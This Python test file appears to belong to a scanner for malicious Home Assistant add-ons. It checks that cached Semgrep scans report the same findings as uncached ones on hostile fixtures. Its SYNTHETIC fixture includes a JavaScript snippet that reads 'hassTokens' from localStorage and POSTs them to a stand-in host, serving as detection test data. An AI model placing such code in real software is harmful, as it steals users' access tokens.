"""(0.14.1) The cache of code already read (scancache): a scan with it finds exactly what
one without it finds, cold and warm, on the hostile fixtures. Nothing here runs scanned
code; Semgrep parses it."""

from __future__ import annotations

import os
import shutil
import time
from pathlib import Path

import pytest

from sniff_test import scancache
from sniff_test.analyzers import semgrep
from sniff_test.fetch.hacs import fetch_local

FIXTURES = Path(__file__).parent / "fixtures"


def test_put_get_off_and_other_keys(tmp_path):
    c = scancache.Cache("logic-a", 1024, root=tmp_path)
    c.put("semgrep", "k", {"results": [1]})
    assert c.get("semgrep", "k") == {"results": [1]}
    assert c.get("semgrep", "other") is None
    off = scancache.Cache("logic-a", 0, root=tmp_path)
    assert off.get("semgrep", "k") is None
    # a new scan-logic key never reads the old answers, and pruning drops them
    new = scancache.Cache("logic-b", 1024, root=tmp_path)
    assert new.get("semgrep", "k") is None
    new.put("semgrep", "k", {"x": 1})
    new.prune()
    assert not (tmp_path / "logic-a").exists() and (tmp_path / "logic-b").exists()


def test_prune_drops_the_least_recently_used_first(tmp_path):
    c = scancache.Cache("logic-a", 1, root=tmp_path)  # 1 MB
    blob = "x" * (400 * 1024)
    for i in range(4):
        c.put("semgrep", f"k{i}", {"b": blob})
        p = c._path("semgrep", f"k{i}")
        os.utime(p, (time.time() - 100 + i, time.time() - 100 + i))
    c.get("semgrep", "k0")  # used just now: kept
    c.prune()
    assert c.get("semgrep", "k0") is not None and c.get("semgrep", "k3") is not None
    assert c.get("semgrep", "k1") is None


def test_only_parse_errors_are_kept():
    assert semgrep._cacheable([{"type": "Syntax error"}, {"type": ["PartialParsing", []]}])
    assert not semgrep._cacheable([{"type": "Timeout"}])
    assert not semgrep._cacheable([{"type": "Out of memory"}])


def _findings(name: str, tmp: Path, cache: scancache.Cache | None):
    ws = tmp / f"ws-{len(list(tmp.iterdir()))}"
    ws.mkdir()
    target = fetch_local(str(FIXTURES / name), ws, None)
    res = semgrep.run(target, ws, cache=cache)
    return (
        res.state,
        res.detail,
        sorted(
            (f.rule_id, str(f.severity), f.file, f.line, f.fingerprint, f.evidence)
            for f in res.findings
        ),
    )


@pytest.mark.skipif(shutil.which("semgrep") is None, reason="needs semgrep")
@pytest.mark.parametrize("name", ["evil_card", "evil_integration", "hidden_card"])
def test_a_cached_scan_finds_the_same(tmp_path, name):
    runs = tmp_path / "runs"
    runs.mkdir()
    plain = _findings(name, runs, None)
    cache = scancache.Cache("logic-test", 1024, root=tmp_path / "cache")
    cold = _findings(name, runs, cache)
    assert cache.stats.hits == 0 and cache.stats.files > 0
    warm_cache = scancache.Cache("logic-test", 1024, root=tmp_path / "cache")
    warm = _findings(name, runs, warm_cache)
    assert plain == cold == warm
    assert warm_cache.stats.hits == warm_cache.stats.files > 0


SYNTHETIC = {
    "manifest.json": '{"domain": "acme_view", "name": "Acme"}',
    "__init__.py": "import os\nTOKEN = os.environ.get('X')\n",
    "www/api.js": (
        "export async function send(url) {\n"
        "  const t = localStorage.getItem('hassTokens');\n"
        "  return fetch(url, {method: 'POST', body: t});\n}\n"
    ),
    "www/user.js": 'import { send } from "./api.js";\nsend("https://collect.invalid/x");\n',
    "www/other.js": "export const a = 1;\n",
}


def _synthetic(app: Path) -> None:
    root = app / "custom_components" / "acme_view"
    for rel, text in SYNTHETIC.items():
        f = root / rel
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(text)


@pytest.mark.skipif(shutil.which("semgrep") is None, reason="needs semgrep")
@pytest.mark.parametrize("name", ["evil_integration", "synthetic"])
def test_a_partly_cached_scan_finds_the_same(tmp_path, name):
    """A new release: one code file changed, the rest answered by the cache (the uncached
    files are read from a mirror folder). Cards install one file, so integrations only."""
    app = tmp_path / "app"
    if name == "synthetic":
        _synthetic(app)
    else:
        shutil.copytree(FIXTURES / name, app)
    runs = tmp_path / "runs"
    runs.mkdir()

    def scan(cache):
        ws = runs / f"ws-{len(list(runs.iterdir()))}"
        ws.mkdir()
        res = semgrep.run(fetch_local(str(app), ws, None), ws, cache=cache)
        return (
            res.state,
            res.detail,
            sorted(
                (f.rule_id, str(f.severity), f.file, f.line, f.fingerprint, f.evidence)
                for f in res.findings
            ),
        )

    scan(scancache.Cache("logic-test", 1024, root=tmp_path / "cache"))
    code = sorted(p for p in app.rglob("*") if p.suffix in (".js", ".py") and p.is_file())
    assert len(code) > 1
    code[0].write_text(code[0].read_text() + "\n// a new release\n")
    partly = scancache.Cache("logic-test", 1024, root=tmp_path / "cache")
    cached = scan(partly)
    assert 0 < partly.stats.hits < partly.stats.files
    assert cached == scan(None)
